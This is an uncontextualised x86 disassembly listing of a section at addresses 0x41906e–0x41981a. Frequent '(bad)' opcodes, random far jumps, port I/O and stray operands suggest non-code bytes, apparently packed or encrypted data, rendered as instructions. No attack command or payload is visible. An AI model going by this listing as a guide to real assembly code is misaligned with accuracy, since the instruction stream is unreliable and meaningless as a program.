  41906e:	push   edx
  41906f:	(bad)  
  419071:	js     0x419030
  419073:	pop    ss
  419074:	rol    esp,1
  419076:	jmp    0x4328:0x2ce95e01
  41907d:	into   
  41907e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41907f:	mov    BYTE PTR [edi+0x47],bl
  419082:	dec    esp
  419083:	dec    ebp
  419084:	jle    0x419024
  419086:	sbb    ch,BYTE PTR [esi]
  419088:	aad    0xb2
  41908a:	add    esi,DWORD PTR [ecx]
  41908c:	sbb    DWORD PTR [eax],0xca7598ac
  419092:	push   esp
  419093:	bound  ebx,QWORD PTR [esi]
  419095:	and    BYTE PTR [edx+0x33],bl
  419098:	cdq    
  419099:	mov    ch,0x24
  41909b:	sub    ecx,DWORD PTR [edi]
  41909d:	pop    ebx
  41909e:	xchg   edx,eax
  41909f:	dec    edx
  4190a0:	fstp   DWORD PTR [eax]
  4190a2:	sbb    DWORD PTR [esi+0x76],edi
  4190a5:	popf   
  4190a6:	fimul  WORD PTR [edx-0x27]
  4190a9:	(bad)  
  4190aa:	mov    ah,0x64
  4190ac:	push   0xffffff8e
  4190ae:	je     0x419108
  4190b0:	xchg   esp,eax
  4190b1:	mov    dl,0x92
  4190b3:	or     ch,BYTE PTR [edx]
  4190b5:	aas    
  4190b6:	sub    BYTE PTR [edi],ah
  4190b8:	retf   0x4633
  4190bb:	dec    edx
  4190bc:	sahf   
  4190bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4190be:	in     al,dx
  4190bf:	mov    ds:0x3a0dce37,al
  4190c4:	adc    edi,esi
  4190c6:	push   0x63
  4190c8:	into   
  4190c9:	repz js 0x4190c8
  4190cc:	ins    BYTE PTR es:[edi],dx
  4190cd:	pop    edx
  4190ce:	jmp    edx
  4190d0:	and    bl,ah
  4190d2:	into   
  4190d3:	fcom   DWORD PTR ds:0x3ddc48ec
  4190d9:	mov    bh,0x38
  4190db:	ins    BYTE PTR es:[edi],dx
  4190dc:	(bad)
  4190df:	rol    DWORD PTR [esi+0x3a54f0d1],1
  4190e5:	dec    edx
  4190e6:	or     ch,BYTE PTR [esi-0x5]
  4190e9:	mov    edi,0xad26068
  4190ee:	sahf   
  4190ef:	mov    edx,cs
  4190f1:	lock jg 0x419119
  4190f4:	xchg   esi,eax
  4190f5:	lahf   
  4190f6:	dec    ebp
  4190f7:	xchg   esi,eax
  4190f8:	mov    ds:0x7b387d0,eax
  4190fd:	fwait
  4190fe:	inc    ebx
  4190ff:	scas   al,BYTE PTR es:[edi]
  419100:	push   edx
  419101:	es in  al,0x66
  419104:	in     al,0x0
  419106:	fadd   QWORD PTR gs:[edx-0x4b]
  41910a:	lea    eax,[ecx+0x3e]
  41910d:	das    
  41910e:	jo     0x41913b
  419110:	out    dx,eax
  419111:	mov    esi,0xa38d1408
  419116:	mov    al,ds:0xed28bee
  41911b:	mov    DWORD PTR [edi+0x52],ecx
  41911e:	mov    dl,0x9b
  419120:	into   
  419121:	nop
  419122:	jl     0x4190d8
  419124:	cld    
  419125:	ret    
  419126:	cmp    al,0x3a
  419128:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419129:	xchg   ebp,eax
  41912a:	sahf   
  41912b:	call   0xb225:0xd6070ab9
  419132:	mov    dh,BYTE PTR [esi+0x40]
  419135:	and    BYTE PTR [esp+edi*2+0x75],ch
  419139:	mov    bl,0x3f
  41913b:	shl    BYTE PTR [esi+0x40],0xc7
  41913f:	inc    eax
  419140:	mov    al,0x8b
  419142:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419143:	mov    ah,0x9f
  419145:	adc    eax,0x10df5f67
  41914a:	popa   
  41914b:	dec    esp
  41914c:	mov    edi,0xc3a6e71
  419151:	ss pop edi
  419153:	stos   DWORD PTR es:[edi],eax
  419154:	stc    
  419155:	push   ds
  419156:	push   es
  419157:	and    al,BYTE PTR [ecx]
  419159:	cmp    eax,0xb021e55e
  41915e:	xor    BYTE PTR [ebx+0x4f115ee],ah
  419164:	pop    eax
  419165:	ret    
  419166:	out    dx,al
  419167:	(bad)  
  419168:	cmp    al,0xa5
  41916a:	xor    BYTE PTR [ecx],cl
  41916c:	or     DWORD PTR [ecx+0x785a0575],ebx
  419172:	scas   al,BYTE PTR es:[edi]
  419173:	repz push ss
  419175:	add    DWORD PTR [ecx-0xd],ecx
  419178:	aaa    
  419179:	push   es
  41917a:	call   0xd3c8:0x138bcb35
  419181:	imul   eax,DWORD PTR [edi-0x2f934ab2],0xc93b877a
  41918b:	jae    0x41918c
  41918d:	jmp    0xb130:0x18026d61
  419194:	idiv   BYTE PTR [esi-0x71]
  419197:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419198:	ja     0x419130
  41919a:	push   ecx
  41919b:	push   ss
  41919c:	int3   
  41919d:	addr16 or dl,cl
  4191a0:	or     esp,ecx
  4191a2:	rcr    BYTE PTR [edi],1
  4191a4:	fcom   QWORD PTR [ebx-0x26]
  4191a7:	pop    esp
  4191a8:	rol    BYTE PTR [edx+0x70],cl
  4191ab:	sbb    dl,BYTE PTR [eax]
  4191ad:	xor    al,0xb2
  4191af:	sbb    al,0x13
  4191b1:	inc    edx
  4191b2:	sbb    eax,0x58dc583f
  4191b7:	cmp    al,0x1a
  4191b9:	ins    BYTE PTR es:[edi],dx
  4191ba:	fwait
  4191bb:	inc    ecx
  4191bc:	push   esi
  4191bd:	and    al,0x49
  4191bf:	gs sub al,0x19
  4191c2:	inc    esp
  4191c3:	push   ds
  4191c4:	mul    ah
  4191c6:	dec    ebx
  4191c7:	adc    ebx,DWORD PTR [ebx+0x39]
  4191ca:	loop   0x4191ca
  4191cc:	sbb    al,0x15
  4191ce:	inc    esp
  4191cf:	mov    al,ds:0x433b58df
  4191d4:	out    dx,eax
  4191d5:	es cld 
  4191d7:	xchg   DWORD PTR [eax+0x3d],esp
  4191da:	outs   dx,BYTE PTR ds:[esi]
  4191dc:	sub    BYTE PTR [ebx-0xc330432],bh
  4191e2:	adc    eax,0x894874ad
  4191e7:	ror    BYTE PTR [eax+0x67],1
  4191ea:	popa   
  4191eb:	or     esp,DWORD PTR [edi]
  4191ed:	aam    0xc0
  4191ef:	xchg   DWORD PTR [ecx],eax
  4191f1:	iret   
  4191f2:	push   0x12dea84e
  4191f7:	add    DWORD PTR [ebx],eax
  4191f9:	ds lock push edx
  4191fc:	lahf   
  4191fd:	mov    WORD PTR [eax-0x13],?
  419200:	push   0xc48b5af
  419205:	fisub  DWORD PTR [eax]
  419207:	push   edx
  419208:	into   
  419209:	inc    edx
  41920a:	ret    0x1d40
  41920d:	pop    ebp
  41920e:	adc    bh,BYTE PTR [edx+0x4c1c4a16]
  419214:	(bad)  
  419216:	enter  0x2268,0x8
  41921a:	shr    DWORD PTR ds:0x4d2cd77,1
  419220:	pushf  
  419221:	push   cs
  419222:	ins    BYTE PTR es:[edi],dx
  419223:	and    BYTE PTR [bp+0x38],dh
  419227:	in     al,0xbb
  419229:	out    dx,eax
  41922a:	jmp    0x4191f7
  41922c:	pop    eax
  41922d:	adc    BYTE PTR [esp+ecx*1-0x4c],dl
  419231:	mov    cl,0x23
  419233:	jl     0x419250
  419235:	add    BYTE PTR [edx-0x76],bl
  419238:	xchg   bl,bl
  41923a:	out    0x89,al
  41923c:	lods   al,BYTE PTR ds:[esi]
  41923d:	scas   al,BYTE PTR es:[edi]
  41923e:	mov    ebx,0xa823cfd0
  419243:	xor    esi,DWORD PTR [ecx+0x2e]
  419246:	sbb    dh,BYTE PTR [eax-0xce3658e]
  41924c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41924d:	inc    esi
  41924e:	in     al,0x11
  419250:	(bad)  
  419252:	jmp    0x9c1b:0x2d250ea4
  419259:	icebp  
  41925a:	jmp    0x3bee:0x3b69e80a
  419261:	sti    
  419262:	fldenv [esi-0x5f]
  419265:	(bad)  
  419266:	mov    bl,0x14
  419268:	int    0x2a
  41926a:	aam    0xd7
  41926c:	add    DWORD PTR [esi+0x4ee570ef],ebp
  419272:	xchg   ah,bh
  419274:	xchg   edi,eax
  419275:	jl     0x4192bb
  419277:	push   ecx
  419278:	dec    ecx
  419279:	(bad)  
  41927a:	in     al,dx
  41927b:	or     esp,DWORD PTR [esi-0x15]
  41927e:	jns    0x41929b
  419280:	les    ebp,FWORD PTR [ebp+esi*1+0x69]
  419284:	popa   
  419285:	mov    al,ds:0xa1a16093
  41928a:	retf   0xa9bd
  41928d:	push   cs
  41928e:	or     cl,BYTE PTR [ebx]
  419290:	aam    0xd9
  419292:	adc    eax,0x76e20319
  419297:	pop    esp
  419298:	or     DWORD PTR [ecx+0x6d9323b5],0xc9df1fd
  4192a2:	rcl    BYTE PTR fs:[esi-0x5526283],0x38
  4192aa:	sub    esp,edx
  4192ac:	inc    eax
  4192ad:	fdivrp st(2),st
  4192af:	out    dx,al
  4192b0:	mov    eax,0xe055c151
  4192b5:	ins    DWORD PTR es:[edi],dx
  4192b6:	dec    eax
  4192b7:	aas    
  4192b8:	dec    esi
  4192b9:	push   esp
  4192ba:	adc    BYTE PTR [eax+0x73252e37],0x65
  4192c1:	and    al,0x20
  4192c3:	mov    esi,0x3fcb837d
  4192c8:	loop   0x4192f2
  4192ca:	dec    ecx
  4192cb:	inc    ebp
  4192cc:	outs   dx,DWORD PTR ds:[esi]
  4192cd:	int    0xc3
  4192cf:	leave  
  4192d0:	imul   esi,DWORD PTR es:[eax-0x3c],0x7f2ba3c4
  4192d8:	aaa    
  4192d9:	sub    edx,0xffffffe6
  4192dc:	mov    cs,WORD PTR [ecx-0x78fe7a53]
  4192e2:	rcr    DWORD PTR [ebp+0x71],0x42
  4192e6:	mov    BYTE PTR ds:0xec5ab917,ch
  4192ec:	adc    al,0xd1
  4192ee:	sub    ah,BYTE PTR ds:0x12efd8a7
  4192f4:	or     esp,DWORD PTR [edi-0x797dcb25]
  4192fa:	sub    dh,BYTE PTR [edx]
  4192fc:	les    esi,FWORD PTR [edi+0x2a064ce]
  419302:	jl     0x419285
  419304:	inc    ecx
  419305:	and    DWORD PTR [ebx],esp
  419307:	mov    eax,0xc7123fe2
  41930c:	inc    eax
  41930d:	xor    eax,DWORD PTR [edx+0xdfc0a05]
  419313:	jg     0x419388
  419315:	push   es
  419316:	jg     0x4192fc
  419318:	inc    esp
  419319:	add    al,0x64
  41931b:	out    0x72,al
  41931d:	jns    0x4192a8
  41931f:	stos   DWORD PTR es:[edi],eax
  419320:	data16 fs cld 
  419323:	rcr    DWORD PTR [ebx+0x58],cl
  419326:	push   ecx
  419327:	adc    edx,DWORD PTR [ecx+edi*1+0x5fe45fad]
  41932e:	mov    eax,ds:0x9315bb7c
  419333:	mov    ds:0x93ae4ae,al
  419338:	loop   0x41935c
  41933a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41933b:	dec    eax
  41933c:	addr16 inc esi
  41933e:	and    bh,BYTE PTR [ebp+0x7ef8bc4]
  419344:	(bad)  
  419346:	test   al,0x57
  419348:	loope  0x41937e
  41934a:	addr16 retf 0xec36
  41934e:	cmp    esp,DWORD PTR gs:[esi]
  419351:	sbb    eax,0xc5736f2a
  419356:	jmp    0x8f41:0xb93c83ae
  41935d:	out    0x90,eax
  41935f:	xchg   edx,eax
  419360:	(bad)  
  419361:	in     al,dx
  419362:	or     al,BYTE PTR [edx-0x77]
  419365:	out    0xa3,eax
  419367:	inc    esi
  419368:	es jae 0x4193c1
  41936b:	xor    eax,0x909c302b
  419370:	and    eax,0x9ef8fff9
  419375:	ds mov bl,0x2c
  419378:	jb     0x41939d
  41937a:	shr    BYTE PTR [eax-0x40b4bfae],1
  419380:	std    
  419381:	xor    ax,0x77a9
  419385:	dec    edx
  419386:	ret    
  419387:	ins    DWORD PTR es:[edi],dx
  419388:	mov    eax,0x492fb638
  41938d:	xchg   esi,eax
  41938e:	push   edi
  41938f:	lods   al,BYTE PTR ds:[esi]
  419390:	ret    
  419391:	and    esp,esi
  419393:	sbb    DWORD PTR [eax],0x1453e5e1
  419399:	xchg   BYTE PTR [eax-0x42],ah
  41939c:	and    eax,0xd2ff0847
  4193a1:	retf   
  4193a2:	call   0x8aea2eb2
  4193a7:	jno    0x4193e4
  4193a9:	ss xor dl,cl
  4193ac:	ret    
  4193ad:	lods   eax,DWORD PTR ds:[esi]
  4193ae:	sub    ecx,DWORD PTR [ebx]
  4193b0:	pop    esi
  4193b1:	cmp    al,BYTE PTR [eax]
  4193b3:	mov    bl,BYTE PTR [ecx-0xed44ea1]
  4193b9:	xor    cl,BYTE PTR [esi+0x69]
  4193bc:	out    dx,eax
  4193bd:	pop    ecx
  4193be:	or     ebp,DWORD PTR [eax-0x6b]
  4193c1:	nop
  4193c2:	adc    al,BYTE PTR [eax+0x21]
  4193c5:	pop    esp
  4193c6:	sub    ebx,DWORD PTR [esi+ebx*2]
  4193c9:	cmp    BYTE PTR [ecx+0x50],dh
  4193cc:	jp     0x4193f6
  4193ce:	shl    DWORD PTR [ecx-0x80],0x5b
  4193d2:	sub    eax,0x9a5f57d5
  4193d7:	in     al,0x9f
  4193d9:	call   0xcb3e5f3a
  4193de:	je     0x419381
  4193e0:	stos   BYTE PTR es:[edi],al
  4193e1:	pop    es
  4193e2:	arpl   bx,ax
  4193e4:	jge    0x419382
  4193e6:	dec    ecx
  4193e7:	mov    ebx,0x2dd1a2c
  4193ec:	das    
  4193ed:	out    dx,eax
  4193ee:	stc    
  4193ef:	(bad)
  4193f2:	inc    edi
  4193f3:	add    ecx,edx
  4193f5:	sbb    DWORD PTR [ecx],edx
  4193f7:	or     DWORD PTR [ecx-0x78],eax
  4193fa:	das    
  4193fb:	cdq    
  4193fc:	scas   al,BYTE PTR es:[edi]
  4193fd:	inc    ebx
  4193fe:	ja     0x419390
  419400:	or     DWORD PTR ss:[esi-0x74],ecx
  419404:	cmp    eax,0xeaf7e8ee
  419409:	fs out 0x9b,eax
  41940c:	sub    BYTE PTR [edi+0x5e8b72b5],0x21
  419413:	pop    ss
  419414:	xor    eax,0x9fe2ade3
  419419:	xchg   BYTE PTR [edi],dl
  41941b:	pop    ebx
  41941c:	jle    0x4193ae
  41941e:	hlt    
  41941f:	jecxz  0x419479
  419421:	push   ebx
  419422:	not    BYTE PTR [esp+ebp*8+0xe]
  419426:	scas   eax,DWORD PTR es:[edi]
  419427:	in     al,0xb5
  419429:	jl     0x4193ad
  41942b:	add    eax,0xf29305dc
  419430:	xchg   edi,eax
  419431:	mov    bl,0x34
  419433:	inc    eax
  419434:	ins    DWORD PTR es:[edi],dx
  419435:	xchg   edi,eax
  419436:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419437:	fist   DWORD PTR [ebp+ebx*4-0x62029d5a]
  41943e:	repnz (bad) 
  419441:	xchg   edi,eax
  419442:	out    dx,eax
  419443:	mov    dl,0x2
  419445:	hlt    
  419446:	in     eax,dx
  419447:	sbb    ch,BYTE PTR [ebp-0x34afc0bc]
  41944d:	int    0x7
  41944f:	sub    DWORD PTR [edi+0x0],eax
  419452:	enter  0x5261,0x97
  419456:	jge    0x41941f
  419458:	sub    esp,DWORD PTR [esi-0x3ce60b6b]
  41945e:	les    esi,FWORD PTR ds:0xfeeb1436
  419464:	stc    
  419465:	ja     0x4193fe
  419467:	pop    es
  419468:	test   eax,0x2573e43f
  41946d:	lods   eax,DWORD PTR ds:[esi]
  41946e:	mov    ecx,0x6f701616
  419473:	lds    edx,FWORD PTR [ecx+esi*2-0x1a]
  419477:	pop    ebx
  419478:	call   0x7777e693
  41947d:	jne    0x419424
  41947f:	lahf   
  419480:	push   esp
  419481:	sbb    ebx,DWORD PTR [ecx-0x4f9ffa01]
  419487:	push   ebx
  419488:	dec    edx
  419489:	jp     0x419487
  41948b:	ja     0x419464
  41948d:	and    eax,0x780279c7
  419492:	fiadd  DWORD PTR [eax+0x1e]
  419495:	fwait
  419496:	mov    esp,0x8b955a08
  41949b:	ins    DWORD PTR es:[edi],dx
  41949c:	imul   ecx,DWORD PTR [eax-0x59],0x3ce27711
  4194a3:	in     eax,0x44
  4194a5:	push   ebp
  4194a6:	mov    DWORD PTR [edx+ebx*1],ebp
  4194a9:	int    0x7
  4194ab:	in     al,0x7d
  4194ad:	call   0xa71b:0xa3bca24b
  4194b4:	lea    edi,[esi+0x7f]
  4194b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4194b8:	pop    esp
  4194b9:	mov    ds:0x6a672d80,eax
  4194be:	imul   esi,DWORD PTR [edi],0x5a304cbc
  4194c4:	neg    DWORD PTR [ebp-0x54656c38]
  4194ca:	pop    eax
  4194cb:	scas   eax,DWORD PTR es:[edi]
  4194cc:	mov    dl,0xea
  4194ce:	imul   edi,DWORD PTR [ebx-0x67],0x24772937
  4194d5:	shl    BYTE PTR [esi-0x5c],cl
  4194d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4194d9:	sub    BYTE PTR es:[edi+0x827363b],al
  4194e0:	add    ebp,edx
  4194e2:	add    eax,0x72d8e36f
  4194e7:	and    eax,DWORD PTR [ecx+0x5e]
  4194ea:	ror    DWORD PTR [esi+0x7],0x78
  4194ee:	and    eax,ebp
  4194f0:	sub    eax,0xa3a8a1d0
  4194f5:	and    al,0x65
  4194f7:	mov    dl,BYTE PTR [edi+0x76]
  4194fa:	xchg   ebx,eax
  4194fb:	pop    ebp
  4194fc:	mov    ecx,0xadd8f37
  419501:	pop    eax
  419502:	sub    esi,DWORD PTR [ebx-0xb]
  419505:	adc    ch,BYTE PTR [esi+ebx*4]
  419508:	std    
  419509:	jb     0x419578
  41950b:	ss div esp
  41950e:	cmc    
  41950f:	sub    eax,0x9fb8e238
  419514:	sbb    BYTE PTR [ebp+0x7dba0b2c],0xea
  41951b:	xor    al,BYTE PTR [ebp*8+0x431f3f38]
  419522:	clc    
  419523:	mov    bl,0xb6
  419525:	jo     0x41957b
  419527:	inc    ebp
  419528:	sbb    DWORD PTR [ebp+0x21],edi
  41952b:	push   edx
  41952c:	dec    ebp
  41952d:	pusha  
  41952e:	push   ecx
  41952f:	sbb    BYTE PTR [edx+0x3edb5717],cl
  419535:	ins    BYTE PTR es:[edi],dx
  419536:	imul   eax,ebp,0x78
  419539:	(bad)  
  41953a:	in     eax,dx
  41953b:	out    0xbd,eax
  41953d:	out    0xcd,eax
  41953f:	cli    
  419540:	mov    eax,ds:0x107b7b7
  419545:	inc    esi
  419546:	in     al,dx
  419547:	mov    al,ds:0x98e295cf
  41954c:	add    si,WORD PTR [esi-0x40]
  419550:	push   esi
  419551:	push   0x3c
  419553:	jmp    FWORD PTR [eax+0x34]
  419556:	jae    0x4194e5
  419558:	cwde   
  419559:	hlt    
  41955a:	mov    DWORD PTR [ecx+0x2f6c83fa],ebp
  419560:	fistp  DWORD PTR [ebp+eax*8-0x7a]
  419564:	std    
  419565:	inc    ebx
  419566:	in     al,0x8a
  419568:	mov    ah,0x29
  41956a:	inc    edx
  41956b:	leave  
  41956c:	mov    eax,ds:0xab3494c7
  419571:	mov    edi,0xca4f692d
  419576:	call   0x28f4:0x703421c
  41957d:	ret    0x349b
  419580:	push   ecx
  419581:	inc    ecx
  419582:	xor    al,0x8
  419584:	xchg   ecx,eax
  419585:	dec    esi
  419586:	pop    ss
  419587:	and    esi,DWORD PTR [ecx-0x71]
  41958a:	pop    ds
  41958b:	xor    edi,0x48
  41958e:	jne    0x4195be
  419590:	fwait
  419591:	and    cl,BYTE PTR [edx]
  419593:	loopne 0x41956e
  419595:	jo     0x4195aa
  419597:	test   DWORD PTR [eax+0x35a98d0f],edi
  41959d:	sub    dh,BYTE PTR [edi+0x7d]
  4195a0:	out    0x73,eax
  4195a2:	cwde   
  4195a3:	xchg   esi,eax
  4195a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4195a5:	jno    0x41956b
  4195a7:	mov    ebp,0x195a5969
  4195ac:	arpl   WORD PTR [eax],bx
  4195ae:	jbe    0x41959c
  4195b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4195b1:	shl    bh,1
  4195b3:	mov    ?,edx
  4195b5:	xor    dh,ch
  4195b7:	pop    ds
  4195b8:	mov    ds:0xb7829e4e,al
  4195bd:	inc    ebx
  4195be:	(bad)  
  4195bf:	mov    ch,dl
  4195c1:	sub    eax,0xf7a0112b
  4195c6:	lds    eax,FWORD PTR ds:[edi+0x15]
  4195ca:	mov    DWORD PTR [edi*2+0x73183d57],esp
  4195d1:	mov    ebp,0xecdec3c9
  4195d6:	loope  0x419657
  4195d8:	(bad)  
  4195d9:	push   eax
  4195da:	mov    ebp,0xf4266296
  4195df:	or     eax,0x5b9c0015
  4195e4:	test   eax,0xec2dc540
  4195e9:	jbe    0x419616
  4195eb:	inc    esi
  4195ec:	gs xchg esp,esp
  4195ef:	xor    eax,0xb0f442fa
  4195f4:	test   cl,ch
  4195f6:	dec    ebx
  4195f7:	dec    DWORD PTR [esi-0x1c]
  4195fa:	cmp    BYTE PTR [ebx+0x4c],bl
  4195fd:	clc    
  4195fe:	xchg   DWORD PTR [edi],edi
  419600:	clc    
  419601:	jp     0x4195c3
  419603:	push   0xffffffa2
  419605:	sub    BYTE PTR [ecx+0x68336287],dl
  41960b:	dec    edi
  41960c:	jmp    0x4195e6
  41960e:	inc    eax
  41960f:	dec    eax
  419610:	pop    edx
  419611:	and    edi,DWORD PTR [eax+ecx*1]
  419614:	imul   eax,ecx,0x9da4eb4f
  41961a:	(bad)  
  41961b:	xchg   edx,eax
  41961c:	inc    esp
  41961d:	pop    edx
  41961e:	mov    eax,ds:0x37775064
  419623:	div    BYTE PTR [ebx-0x41031a53]
  419629:	test   BYTE PTR [edx-0x4df245b6],0x62
  419630:	mov    esp,0x2fd66def
  419635:	pop    es
  419636:	lock fwait
  419638:	mov    ah,0x22
  41963a:	loop   0x41965c
  41963c:	icebp  
  41963d:	cmp    DWORD PTR [esi+0x2c],ecx
  419640:	sub    al,0xa7
  419642:	xlat   BYTE PTR ds:[ebx]
  419643:	fist   WORD PTR [edi-0x51bf9658]
  419649:	mov    DWORD PTR [esi+0x4c],esp
  41964c:	and    cl,BYTE PTR [eax-0x49706c79]
  419652:	push   ecx
  419653:	inc    eax
  419654:	aam    0x48
  419656:	retf   0x763b
  419659:	sub    BYTE PTR [edi-0x511c4850],dl
  41965f:	in     eax,0xb7
  419661:	add    DWORD PTR [ebp-0x46],0x1e1e25cf
  419668:	inc    ecx
  419669:	stos   DWORD PTR es:[edi],eax
  41966a:	pop    ebp
  41966b:	(bad)  ss:[ebx]
  41966e:	fcomp  QWORD PTR [ebp+0x67]
  419671:	loope  0x41963a
  419673:	sub    edx,ecx
  419675:	inc    esp
  419676:	mov    dh,0x8f
  419678:	test   eax,0x16299191
  41967d:	mov    ch,0xbb
  41967f:	push   ebp
  419680:	shl    BYTE PTR [ecx-0x2c7b6cf5],1
  419686:	(bad)  
  419687:	int    0x3f
  419689:	sti    
  41968a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41968b:	push   es
  41968c:	xor    BYTE PTR [edx],bl
  41968e:	inc    ecx
  41968f:	sbb    ch,BYTE PTR [eax-0x49]
  419692:	jae    0x419694
  419694:	cwde   
  419695:	jb     0x4196b9
  419697:	xchg   esp,eax
  419698:	cmc    
  419699:	cdq    
  41969a:	xchg   esi,eax
  41969b:	mov    eax,ds:0xc5fef504
  4196a0:	push   eax
  4196a1:	xchg   edx,eax
  4196a2:	push   ebx
  4196a3:	(bad)  
  4196a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4196a5:	scas   al,BYTE PTR es:[edi]
  4196a6:	fbld   TBYTE PTR [ebx-0x20a21e27]
  4196ac:	sbb    edi,DWORD PTR [ebp+0x61]
  4196af:	int3   
  4196b0:	push   ebp
  4196b1:	xchg   ebx,eax
  4196b2:	fwait
  4196b3:	(bad)  
  4196b4:	mov    esp,0x8b1a89cc
  4196b9:	mov    cl,0x16
  4196bb:	loope  0x4196c0
  4196bd:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196bf:	(bad)  
  4196c1:	(bad)  
  4196c2:	lock (bad) 
  4196c4:	dec    ebp
  4196c5:	bound  edi,QWORD PTR [ebx]
  4196c7:	loope  0x419696
  4196c9:	adc    ebp,0xffffff9a
  4196cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4196cd:	dec    edx
  4196ce:	jo     0x4196a6
  4196d0:	pop    edi
  4196d1:	loop   0x419727
  4196d3:	dec    edx
  4196d4:	aad    0xfb
  4196d6:	sub    ch,BYTE PTR [ecx]
  4196d8:	gs mov eax,0x566c325b
  4196de:	in     al,0xf6
  4196e0:	bound  ebp,QWORD PTR [edi-0x47]
  4196e3:	pop    esp
  4196e4:	or     eax,0x114e3889
  4196e9:	push   ebx
  4196ea:	adc    BYTE PTR [ecx],0x9a
  4196ed:	jns    0x41973e
  4196ef:	mov    ebp,0xca1a622
  4196f4:	jg     0x4196ff
  4196f6:	in     eax,dx
  4196f7:	stos   BYTE PTR es:[edi],al
  4196f8:	sub    DWORD PTR [ecx-0x27],0xffffffd6
  4196fc:	jmp    0xda8ef914
  419701:	test   eax,0x99d4ee99
  419706:	jmp    0x92c004db
  41970b:	lods   al,BYTE PTR ds:[esi]
  41970c:	mov    eax,DWORD PTR [edx]
  41970e:	xchg   esi,eax
  41970f:	out    0x51,al
  419711:	loop   0x4196d0
  419713:	cmp    al,0x6b
  419715:	adc    eax,DWORD PTR [ebp-0x6b]
  419718:	mov    ecx,ds
  41971a:	xchg   esi,eax
  41971b:	xchg   esp,eax
  41971c:	add    DWORD PTR [ebx+0x54],0x2d
  419720:	mov    ebx,esp
  419722:	inc    esp
  419723:	call   0x4cc4d22c
  419728:	fstp   DWORD PTR [ebp+ecx*4-0x4e]
  41972c:	sbb    al,0x68
  41972e:	jp     0x419761
  419730:	icebp  
  419731:	in     al,0x9f
  419733:	jmp    0x594f7141
  419738:	pop    ss
  419739:	dec    edi
  41973a:	not    BYTE PTR [eax-0x65]
  41973d:	adc    eax,0xe8dbac6c
  419742:	fisubr WORD PTR [eax+edx*4]
  419745:	stc    
  419746:	fbstp  TBYTE PTR [ebx]
  419748:	xchg   bh,dl
  41974a:	lahf   
  41974b:	mov    ecx,0xc3a2b981
  419750:	clc    
  419751:	pop    ebp
  419752:	enter  0x19aa,0x44
  419756:	push   cs
  419757:	jmp    0x419752
  419759:	mov    ecx,0x7a9368d1
  41975e:	(bad)  
  41975f:	mov    al,ds:0x5d111308
  419764:	fwait
  419765:	adc    ch,BYTE PTR [edx+eax*8-0x4792d0e8]
  41976c:	xchg   edx,eax
  41976d:	or     ecx,eax
  41976f:	out    0x9b,eax
  419771:	jecxz  0x41979b
  419773:	jbe    0x41971d
  419775:	sar    eax,cl
  419777:	pop    edx
  419778:	nop
  419779:	std    
  41977a:	cld    
  41977b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41977c:	xchg   ecx,eax
  41977d:	dec    eax
  41977e:	adc    al,0x6b
  419780:	sub    eax,0x250c7686
  419785:	xchg   cl,dh
  419787:	adc    al,0xdd
  419789:	inc    esi
  41978a:	out    0xf,al
  41978c:	ins    BYTE PTR es:[edi],dx
  41978d:	repnz stc 
  41978f:	in     al,dx
  419790:	repz mov bh,0x71
  419793:	out    dx,eax
  419794:	and    DWORD PTR [ebp-0xd4a40c7],esp
  41979a:	sar    BYTE PTR [ebx-0x6b],cl
  41979d:	mov    ah,0x25
  41979f:	ins    DWORD PTR es:[edi],dx
  4197a0:	int3   
  4197a1:	pop    ds
  4197a2:	and    BYTE PTR [edi+eiz*8],cl
  4197a5:	push   eax
  4197a6:	cld    
  4197a7:	std    
  4197a8:	or     BYTE PTR [eax+ecx*8],0xaf
  4197ac:	cmp    eax,0x15bf9dff
  4197b1:	jmp    0xd789fbb1
  4197b6:	int    0x40
  4197b8:	mov    bl,0x90
  4197ba:	sti    
  4197bb:	add    BYTE PTR [eax],cl
  4197bd:	inc    ebx
  4197be:	aad    0x25
  4197c0:	push   edx
  4197c1:	(bad)  
  4197c2:	mov    ds:0xffabeb57,eax
  4197c7:	mov    ds:0xcec284e3,eax
  4197cc:	pop    esp
  4197cd:	cmc    
  4197ce:	push   ebp
  4197cf:	mov    ecx,DWORD PTR [edi]
  4197d1:	dec    ecx
  4197d2:	ja     0x419838
  4197d4:	xchg   ecx,eax
  4197d5:	mov    al,0xcb
  4197d7:	xchg   BYTE PTR [edx+0x28],ah
  4197da:	test   BYTE PTR [ecx],dl
  4197dc:	mov    ch,0x60
  4197de:	in     al,dx
  4197df:	or     BYTE PTR [ecx],bh
  4197e1:	cmp    dh,0xee
  4197e4:	outs   dx,BYTE PTR ds:[esi]
  4197e5:	pop    esi
  4197e6:	out    dx,al
  4197e7:	mov    esi,0xd70341ec
  4197ec:	int    0x89
  4197ee:	sar    DWORD PTR [edx],1
  4197f0:	punpckhdq mm4,QWORD PTR [eax+0x24]
  4197f4:	in     al,0x9c
  4197f6:	mov    DWORD PTR [ecx],eax
  4197f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4197f9:	dec    edx
  4197fa:	xchg   ecx,eax
  4197fb:	mov    ch,0x5f
  4197fd:	push   eax
  4197fe:	adc    eax,0x1bebe094
  419803:	mov    eax,ds:0x415e3f04
  419808:	lods   al,BYTE PTR ds:[esi]
  419809:	jp     0x419806
  41980b:	add    BYTE PTR [esp+ecx*8],cl
  41980e:	cmp    DWORD PTR [edx],ebx
  419810:	lock sub DWORD PTR [ecx+ebp*1],eax
  419814:	lea    edi,[esi+0x1]
  419817:	adc    ch,dh
  419819:	inc    edi
  41981a:	es jmp 0xe67f:0x340b5826
